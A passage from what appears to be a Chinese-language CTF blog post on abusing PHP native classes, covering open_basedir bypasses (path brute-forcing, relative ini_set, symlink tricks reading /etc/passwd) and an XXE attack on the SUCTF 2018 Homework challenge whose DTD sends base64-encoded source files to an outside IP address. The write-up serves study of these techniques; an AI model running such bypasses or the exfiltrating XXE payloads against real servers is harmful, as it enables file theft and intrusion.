</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;open_basedir&#39;</span><span class=p>,</span> <span class=nx>dirname</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>printf</span><span class=p>(</span><span class=s2>&#34;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#34;</span><span class=p>,</span> <span class=nx>ini_get</span><span class=p>(</span><span class=s1>&#39;open_basedir&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>set_error_handler</span><span class=p>(</span><span class=s1>&#39;isexists&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$dir</span> <span class=o>=</span> <span class=s1>&#39;d:/blog/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$chars</span> <span class=o>=</span> <span class=s1>&#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$chars</span><span class=p>);</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span> 
</span></span><span class=line><span class=cl>    <span class=nv>$file</span> <span class=o>=</span> <span class=nv>$dir</span> <span class=o>.</span> <span class=nv>$chars</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span> <span class=o>.</span> <span class=s1>&#39;&lt;&gt;&lt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>realpath</span><span class=p>(</span><span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>isexists</span><span class=p>(</span><span class=nv>$errno</span><span class=p>,</span> <span class=nv>$errstr</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$regexp</span> <span class=o>=</span> <span class=s1>&#39;/File\((.*)\) is not within/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nx>preg_match</span><span class=p>(</span><span class=nv>$regexp</span><span class=p>,</span> <span class=nv>$errstr</span><span class=p>,</span> <span class=nv>$matches</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$matches</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>printf</span><span class=p>(</span><span class=s2>&#34;%s &lt;br/&gt;&#34;</span><span class=p>,</span> <span class=nv>$matches</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>主要看看函数这里</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$regexp</span> <span class=o>=</span> <span class=s1>&#39;/File\((.*)\) is not within/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>preg_match</span><span class=p>(</span><span class=nv>$regexp</span><span class=p>,</span> <span class=nv>$errstr</span><span class=p>,</span> <span class=nv>$matches</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>首先就是利用正则来匹配文件，如果匹配到了错误，那么<code>$mathes</code>就会得到值，</p><p>而其内部其实是这样</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$matches = [
</span></span><span class=line><span class=cl>    0 =&gt; &#39;File(C:\Windows\System32\drivers\etc\hosts) is not within&#39;,
</span></span><span class=line><span class=cl>    1 =&gt; &#39;C:\Windows\System32\drivers\etc\hosts&#39;
</span></span><span class=line><span class=cl>];
</span></span></code></pre></td></tr></table></div></div><p>所以就能得到文件路径(本地是通了的这个)</p><p>其中还有很多类似的通过暴力破解的方法，详情可以看p牛的博客</p><p><code>https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html</code></p><p>类似的有<code>bindtextdomain()</code>,<code>SplFileInfo::getRealPath()</code>,<code>imageftbbox()</code>还是挺多的</p><h5 id=ini_set--相对路径>ini_set() + 相对路径</h5><blockquote><p>由于open_basedir自身的问题，设置为相对路径<code>..</code>在解析的时候会致使自身向上跳转一层</p></blockquote><p>以此类推就可以达到理想路径进行文件读取了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>ini_get</span><span class=p>(</span><span class=s1>&#39;open_basedir&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>mkdir</span><span class=p>(</span><span class=s1>&#39;test&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>chdir</span><span class=p>(</span><span class=s1>&#39;test&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;open_basedir&#39;</span><span class=p>,</span><span class=s1>&#39;..&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>chdir</span><span class=p>(</span><span class=s1>&#39;..&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>chdir</span><span class=p>(</span><span class=s1>&#39;..&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>chdir</span><span class=p>(</span><span class=s1>&#39;..&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>ini_set</span><span class=p>(</span><span class=s1>&#39;open_basedir&#39;</span><span class=p>,</span><span class=s1>&#39;/&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/etc/passwd&#39;</span><span class=p>);</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><h5 id=shell>shell</h5><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>ini_get</span><span class=p>(</span><span class=s1>&#39;open_basedir&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;cat /etc/passwd&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>这样的payload可以直接打，无限制</p><h5 id=symlink>symlink()</h5><p>进行文件常见符号链接，软链接知道吧，差不多是这个意思，取个别名</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>bool</span> <span class=nx>symlink</span> <span class=p>(</span> <span class=nx>string</span> <span class=nv>$target</span> <span class=p>,</span> <span class=nx>string</span> <span class=nv>$link</span> <span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><ul><li><strong>$target</strong>：指向的目标文件或目录的路径，即符号链接指向的实际文件或目录。</li><li><strong>$link</strong>：符号链接的路径名称，即创建的符号链接的名称。</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>symlink</span><span class=p>(</span><span class=s1>&#39;/var/www/html&#39;</span><span class=p>,</span> <span class=s1>&#39;./bao&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>这个时候访问<code>bao</code>就相当于访问<code>/var/www/html</code></p><p>那么可以利用的poc,也就是通过路径的伪装来绕过</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>mkdir</span><span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>mkdir</span><span class=p>(</span><span class=s2>&#34;B&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;B&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>mkdir</span><span class=p>(</span><span class=s2>&#34;C&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;C&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>mkdir</span><span class=p>(</span><span class=s2>&#34;D&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;D&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>chdir</span><span class=p>(</span><span class=s2>&#34;..&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>symlink</span><span class=p>(</span><span class=s2>&#34;A/B/C/D&#34;</span><span class=p>,</span><span class=s2>&#34;bao&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>symlink</span><span class=p>(</span><span class=s2>&#34;bao/../../../../etc/passwd&#34;</span><span class=p>,</span><span class=s2>&#34;POC&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;bao&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>mkdir</span><span class=p>(</span><span class=s2>&#34;bao&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s2>&#34;cat POC&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>那么这个<code>poc</code>就可以读取文件<code>/etc/passwd</code>,为什么是四层呢，因为本身我们在的目录是</p><p><code>/var/www/html</code>,所以至少是四层，但是会有个疑问对吧，不是说好的<code>bao</code>相当于是<code>A/B/C/D</code>嘛，这四层也仅仅只能回退到<code>/var/www/html</code>里面啊</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:/var/www/html# ls
</span></span><span class=line><span class=cl>7.php  A  POC  bao  index.nginx-debian.html  test.dtd
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:/var/www/html# <span class=nb>cd</span> bao/../../../../etc
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:/etc# 
</span></span></code></pre></td></tr></table></div></div><p>这个弄了半天好似理解了，就相当于是在相对路径里面夹杂了绝对路径，所以测试的时候也是成功了</p><h3 id=xxe>xxe</h3><h4 id=simplexmlelement>SimpleXMLElement</h4><p>可以利用这个原生类进行<code>xxe</code>攻击</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$x</span><span class=o>=</span><span class=k>new</span> <span class=nx>SimpleXMLElement</span><span class=p>(</span><span class=s2>&#34;http://xxx.xxx.xxx.xxx/evil.xml&#34;</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=k>true</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/php-native-class-exploitation/QQ20240920-185523.png width=858 height=695 srcset="/p/php-native-class-exploitation/QQ20240920-185523_hu_b056be6c7b9f2ce0.png 480w, /p/php-native-class-exploitation/QQ20240920-185523_hu_48f31ce7ba871d8c.png 1024w" loading=lazy alt=2 class=gallery-image data-flex-grow=123 data-flex-basis=296px></p><p>当确定为<code>true</code>时，会当成<code>xml</code>文档解析,这不就典型<code>xxe</code>了嘛，所以只要<code>xxe</code>,能打的都能打</p><p>demo <strong>[SUCTF 2018]Homework</strong></p><p>注册账号登录之后得到源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>calc</span><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>function</span> <span class=nf>__construct__</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>		<span class=nx>calc</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>function</span> <span class=nf>calc</span><span class=p>(</span><span class=nv>$args1</span><span class=p>,</span><span class=nv>$method</span><span class=p>,</span><span class=nv>$args2</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$args1</span><span class=o>=</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$args1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=nv>$args2</span><span class=o>=</span><span class=nx>intval</span><span class=p>(</span><span class=nv>$args2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>switch</span> <span class=p>(</span><span class=nv>$method</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=s1>&#39;a&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=nv>$method</span><span class=o>=</span><span class=s2>&#34;+&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=s1>&#39;b&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=nv>$method</span><span class=o>=</span><span class=s2>&#34;-&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=s1>&#39;c&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=nv>$method</span><span class=o>=</span><span class=s2>&#34;*&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=k>case</span> <span class=s1>&#39;d&#39;</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=nv>$method</span><span class=o>=</span><span class=s2>&#34;/&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>				<span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>			
</span></span><span class=line><span class=cl>			<span class=k>default</span><span class=o>:</span>
</span></span><span class=line><span class=cl>				<span class=k>die</span><span class=p>(</span><span class=s2>&#34;invalid input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=nv>$Expression</span><span class=o>=</span><span class=nv>$args1</span><span class=o>.</span><span class=nv>$method</span><span class=o>.</span><span class=nv>$args2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=k>eval</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\$</span><span class=s2>r=</span><span class=si>$Expression</span><span class=s2>;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>die</span><span class=p>(</span><span class=s2>&#34;Calculation results:&#34;</span><span class=o>.</span><span class=nv>$r</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>再度进入页面之后知道</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/show.php?module=calc&amp;args[]=2&amp;args[]=a&amp;args[]=2
</span></span></code></pre></td></tr></table></div></div><p><code>module</code>是调用的类,那么我们构造<code>payload</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/show.php?module=SimpleXMLElement&amp;args[]=http://27.25.151.48:12138/poc.xml&amp;args[]=2&amp;args[]=true
</span></span></code></pre></td></tr></table></div></div><p>poc.xml</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!DOCTYPE try[
</span></span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % int SYSTEM &#34;http://27.25.151.48:12138/poc.dtd&#34;&gt;</span>
</span></span><span class=line><span class=cl>%int;
</span></span><span class=line><span class=cl>]&gt;
</span></span></code></pre></td></tr></table></div></div><p>poc.dtd</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml><span class=line><span class=cl><span class=cp>&lt;!ENTITY % payl SYSTEM &#34;php://filter/read=convert.base64-encode/resource=index.php&#34;&gt;</span>
</span></span><span class=line><span class=cl><span class=cp>&lt;!ENTITY % all &#34;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://27.25.151.48:9999/?%payl;&#39;&gt;</span>&#34;&gt;
</span></span><span class=line><span class=cl>%all;
</span></span><span class=line><span class=cl>%send;
</span></span></code></pre></td></tr></table></div></div><p>然后监听得到源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>	<span class=k>include</span><span class=p>(</span><span class=s2>&#34;function.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>include</span><span class=p>(</span><span class=s2>&#34;config.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=nv>$username</span><span class=o>=</span><span class=nx>w_addslashes</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=nv>$check_code</span><span class=o>=</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;cookie-check&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=nv>$check_sql</span><span class=o>=</span><span class=s2>&#34;select password from user where username=&#39;&#34;</span><span class=o>.</span><span class=nv>$username</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$check_sum</span><span class=o>=</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$username</span><span class=o>.</span><span class=nx>sql_result</span><span class=p>(</span><span class=nv>$check_sql</span><span class=p>,</span><span class=nv>$mysql</span><span class=p>)[</span><span class=s1>&#39;0&#39;</span><span class=p>][</span><span class=s1>&#39;0&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$check_sum</span><span class=o>!==</span><span class=nv>$check_code</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=nx>header</span><span class=p>(</span><span class=s2>&#34;Location: login.php&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>把<code>dtd</code>改改然后接着读就可以了</p><p><code>function.php</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>sql_result</span><span class=p>(</span><span class=nv>$sql</span><span class=p>,</span><span class=nv>$mysql</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$result</span><span class=o>=</span><span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$mysql</span><span class=p>,</span><span class=nv>$sql</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>		<span class=nv>$result_array</span><span class=o>=</span><span class=nx>mysqli_fetch_all</span><span class=p>(</span><span class=nv>$result</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=nv>$result_array</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>		 <span class=k>echo</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$mysql</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		 <span class=k>return</span> <span class=s2>&#34;Failed&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>upload_file</span><span class=p>(</span><span class=nv>$mysql</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>){</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;size&#39;</span><span class=p>]</span><span class=o>&gt;</span><span class=mi>2</span><span class=o>*</span><span class=mi>1024</span><span class=o>*</span><span class=mi>1024</span><span class=p>){</span>
</span></span><span class=line><span class=cl>			<span class=k>die</span><span class=p>(</span><span class=s2>&#34;File is larger than 2M, forbidden upload&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>is_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>			<span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>sql_result</span><span class=p>(</span><span class=s2>&#34;select * from file where filename=&#39;&#34;</span><span class=o>.</span><span class=nx>w_addslashes</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;name&#39;</span><span class=p>])</span><span class=o>.</span><span class=s2>&#34;&#39;&#34;</span><span class=p>,</span><span class=nv>$mysql</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>				<span class=nv>$filehash</span><span class=o>=</span><span class=nx>md5</span><span class=p>(</span><span class=nx>mt_rand</span><span class=p>());</span>
